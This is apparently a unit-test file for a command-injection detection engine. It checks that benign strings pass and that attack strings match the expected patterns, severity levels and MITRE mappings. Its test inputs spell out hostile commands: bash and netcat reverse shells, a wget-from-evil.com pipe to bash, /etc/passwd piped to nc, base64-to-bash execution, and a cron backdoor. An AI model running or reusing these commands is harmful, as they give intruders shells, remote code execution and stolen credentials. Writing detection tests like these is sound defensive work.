/**
 * VARIANT — Command Injection Detection Engine Tests
 *
 * Tests for Command Injection engine covering:
 * - Benign input detection
 * - Malicious input detection with correct severity
 * - MITRE technique mapping
 * - CWE ID mapping
 * - Multiple attack pattern detection
 */
import { describe, it, expect } from 'vitest';
import { createCmdIEngine } from '../../../src/lib/detection/cmdi-engine';
// unit tests — types not required
describe('Command Injection Detection Engine', () => {
    describe('Benign Input Detection', () => {
        it('returns empty result for benign input', () => {
            const engine = createCmdIEngine();
            const result = engine.analyze('hello world');

            expect(result.detected).toBe(false);
            expect(result.confidence).toBe(0);
            expect(result.matches).toHaveLength(0);
            expect(result.category).toBe('command-injection');
        });

        it('returns empty result for safe filename', () => {
            const engine = createCmdIEngine();
            const result = engine.analyze('document.pdf');

            expect(result.detected).toBe(false);
            expect(result.matches).toHaveLength(0);
        });

        it('returns empty result for normal search query', () => {
            const engine = createCmdIEngine();
            const result = engine.analyze('search term');

            expect(result.detected).toBe(false);
        });

        it('returns empty result for alphanumeric input', () => {
            const engine = createCmdIEngine();
            const result = engine.analyze('user123');

            expect(result.detected).toBe(false);
        });
    });

    describe('Malicious Input Detection with Severity', () => {
        it('detects semicolon command chain as critical severity', () => {
            const engine = createCmdIEngine();
            const result = engine.analyze('file.txt; cat /etc/passwd');

            expect(result.detected).toBe(true);
            expect(result.matches.some(m => m.severity === 'critical')).toBe(true);
            expect(result.matches.some(m => m.patternId === 'cmdi/semicolon-chain')).toBe(true);
        });

        it('detects pipe command chain as critical severity', () => {
            const engine = createCmdIEngine();
            const result = engine.analyze('echo hello | cat /etc/passwd');

            expect(result.detected).toBe(true);
            expect(result.matches.some(m => m.severity === 'critical')).toBe(true);
            expect(result.matches.some(m => m.patternId === 'cmdi/pipe-chain')).toBe(true);
        });

        it('detects backtick substitution as critical severity', () => {
            const engine = createCmdIEngine();
            const result = engine.analyze('echo `whoami`');

            expect(result.detected).toBe(true);
            expect(result.matches.some(m => m.patternId === 'cmdi/backtick')).toBe(true);
        });

        it('detects $() substitution as critical severity', () => {
            const engine = createCmdIEngine();
            const result = engine.analyze('echo $(id)');

            expect(result.detected).toBe(true);
            expect(result.matches.some(m => m.patternId === 'cmdi/dollar-paren')).toBe(true);
        });

        it('detects && command chain as critical severity', () => {
            const engine = createCmdIEngine();
            const result = engine.analyze('valid_cmd && cat /etc/passwd');

            expect(result.detected).toBe(true);
            expect(result.matches.some(m => m.patternId === 'cmdi/and-chain')).toBe(true);
        });

        it('detects bash reverse shell as critical severity', () => {
            const engine = createCmdIEngine();
            const result = engine.analyze('bash -i >& /dev/tcp/10.0.0.1/4444 0>&1');

            expect(result.detected).toBe(true);
            expect(result.matches.some(m => m.patternId === 'cmdi/reverse-shell-bash')).toBe(true);
        });

        it('detects wget pipe to bash as critical severity', () => {
            const engine = createCmdIEngine();
            const result = engine.analyze('wget http://evil.com/shell.sh | bash');

            expect(result.detected).toBe(true);
            // either wget-exec or curl-pipe-bash may match depending on pattern matching
            expect(result.matches.some(m => ['cmdi/wget-exec', 'cmdi/curl-pipe-bash'].includes(m.patternId))).toBe(true);
        });

        it('detects /etc/passwd read as high severity', () => {
            const engine = createCmdIEngine();
            const result = engine.analyze('cat /etc/passwd');

            expect(result.detected).toBe(true);
            expect(result.matches.some(m => m.severity === 'high')).toBe(true);
            expect(result.matches.some(m => m.patternId === 'cmdi/etc-passwd')).toBe(true);
        });
    });

    describe('MITRE Technique Mapping', () => {
        it('maps command injection to T1059', () => {
            const engine = createCmdIEngine();
            const result = engine.analyze('file.txt; cat /etc/passwd');

            expect(result.detected).toBe(true);
            expect(result.mitreTechniques).toContain('T1059');
        });

        it('includes MITRE techniques for reverse shells', () => {
            const engine = createCmdIEngine();
            const result = engine.analyze('nc -e /bin/sh 10.0.0.1 4444');

            expect(result.detected).toBe(true);
            expect(result.mitreTechniques).toBeDefined();
            expect(result.mitreTechniques).toContain('T1059');
        });

        it('does not include MITRE techniques for benign input', () => {
            const engine = createCmdIEngine();
            const result = engine.analyze('hello world');

            expect(result.detected).toBe(false);
            expect(result.mitreTechniques).toBeUndefined();
        });
    });

    describe('CWE ID Mapping', () => {
        it('categorizes as command-injection category', () => {
            const engine = createCmdIEngine();
            const result = engine.analyze('file.txt; cat /etc/passwd');

            expect(result.detected).toBe(true);
            expect(result.category).toBe('command-injection');
        });

        it('maintains category for complex injections', () => {
            const engine = createCmdIEngine();
            const result = engine.analyze('input && whoami || id');

            expect(result.category).toBe('command-injection');
        });
    });

    describe('Multiple Attack Pattern Detection', () => {
        it('detects multiple patterns in complex payload', () => {
            const engine = createCmdIEngine();
            const result = engine.analyze('file.txt; cat /etc/passwd | grep root');

            expect(result.detected).toBe(true);
            expect(result.matches.length).toBeGreaterThan(1);
        });

        it('detects semicolon and pipe together', () => {
            const engine = createCmdIEngine();
            const result = engine.analyze('cmd; cat /etc/passwd | nc 10.0.0.1 4444');

            expect(result.matches.some(m => m.patternId === 'cmdi/semicolon-chain')).toBe(true);
            expect(result.matches.some(m => m.patternId === 'cmdi/pipe-chain')).toBe(true);
        });

        it('detects command substitution patterns', () => {
            const engine = createCmdIEngine();
            const result = engine.analyze('echo `id` $(whoami)');

            expect(result.matches.some(m => m.patternId === 'cmdi/backtick')).toBe(true);
            expect(result.matches.some(m => m.patternId === 'cmdi/dollar-paren')).toBe(true);
        });

        it('detects sudo abuse', () => {
            const engine = createCmdIEngine();
            const result = engine.analyze('sudo bash');

            expect(result.detected).toBe(true);
            expect(result.matches.some(m => m.patternId === 'cmdi/sudo-abuse')).toBe(true);
        });

        it('detects netcat reverse shell', () => {
            const engine = createCmdIEngine();
            const result = engine.analyze('nc -e /bin/sh 192.168.1.1 4444');

            expect(result.detected).toBe(true);
            expect(result.matches.some(m => m.patternId === 'cmdi/reverse-shell-nc')).toBe(true);
        });

        it('detects python reverse shell', () => {
            const engine = createCmdIEngine();
            const result = engine.analyze('python -c "import socket,subprocess,os;s=socket.socket()"');

            expect(result.detected).toBe(true);
            expect(result.matches.some(m => m.patternId === 'cmdi/reverse-shell-python')).toBe(true);
        });

        it('detects base64 decode execution', () => {
            const engine = createCmdIEngine();
            const result = engine.analyze('echo dGVzdA== | base64 -d | bash');

            expect(result.detected).toBe(true);
            expect(result.matches.some(m => m.patternId === 'cmdi/base64-decode')).toBe(true);
        });

        it('detects Windows CMD injection', () => {
            const engine = createCmdIEngine();
            const result = engine.analyze('cmd /c dir');

            expect(result.detected).toBe(true);
            expect(result.matches.some(m => m.patternId === 'cmdi/windows-cmd')).toBe(true);
        });

        it('increases confidence with multiple patterns', () => {
            const engine = createCmdIEngine();
            const simpleResult = engine.analyze('file.txt; ls');
            const complexResult = engine.analyze('file.txt; cat /etc/passwd | nc 10.0.0.1 4444 && whoami');

            expect(complexResult.confidence).toBeGreaterThanOrEqual(simpleResult.confidence);
        });

        it('tracks unique pattern matches', () => {
            const engine = createCmdIEngine();
            const result = engine.analyze('file.txt; id; whoami; cat /etc/passwd');

            const uniquePatterns = new Set(result.matches.map(m => m.patternId));
            expect(uniquePatterns.size).toBeGreaterThanOrEqual(2);
        });
    });

    describe('Engine Interface Compliance', () => {
        it('returns correct engine ID', () => {
            const engine = createCmdIEngine();
            expect(engine.id).toBe('cmdi-detection');
        });

        it('returns correct category', () => {
            const engine = createCmdIEngine();
            expect(engine.category).toBe('command-injection');
        });

        it('returns patterns via getPatterns()', () => {
            const engine = createCmdIEngine();
            const patterns = engine.getPatterns();

            expect(patterns.length).toBeGreaterThan(0);
            expect(patterns.some(p => p.id === 'cmdi/semicolon-chain')).toBe(true);
        });

        it('returns config via getConfig()', () => {
            const engine = createCmdIEngine();
            const config = engine.getConfig();

            expect(config.sensitivity).toBeDefined();
            expect(config.confidenceThreshold).toBeDefined();
            expect(config.maxInputLength).toBeDefined();
        });
    });

    describe('Edge Cases', () => {
        it('handles empty input', () => {
            const engine = createCmdIEngine();
            const result = engine.analyze('');

            expect(result.detected).toBe(false);
            expect(result.matches).toHaveLength(0);
        });

        it('handles URL-encoded input', () => {
            const engine = createCmdIEngine();
            const result = engine.analyze('file.txt%3B%20cat%20%2Fetc%2Fpasswd');

            expect(result.detected).toBe(true);
        });

        it('provides explanation for detected input', () => {
            const engine = createCmdIEngine();
            const result = engine.analyze('file.txt; cat /etc/passwd');

            expect(result.explanation).toContain('Command injection detected');
        });

        it('provides explanation for clean input', () => {
            const engine = createCmdIEngine();
            const result = engine.analyze('hello world');

            expect(result.explanation).toContain('No command injection');
        });

        it('detects chmod SUID setting', () => {
            const engine = createCmdIEngine();
            const result = engine.analyze('chmod u+s /bin/bash');

            expect(result.detected).toBe(true);
            expect(result.matches.some(m => m.patternId === 'cmdi/chmod-suid')).toBe(true);
        });

        it('detects output redirection to system directory', () => {
            const engine = createCmdIEngine();
            const result = engine.analyze('echo evil > /etc/cron.d/backdoor');

            expect(result.detected).toBe(true);
            expect(result.matches.some(m => m.patternId === 'cmdi/output-redirect')).toBe(true);
        });
    });
});
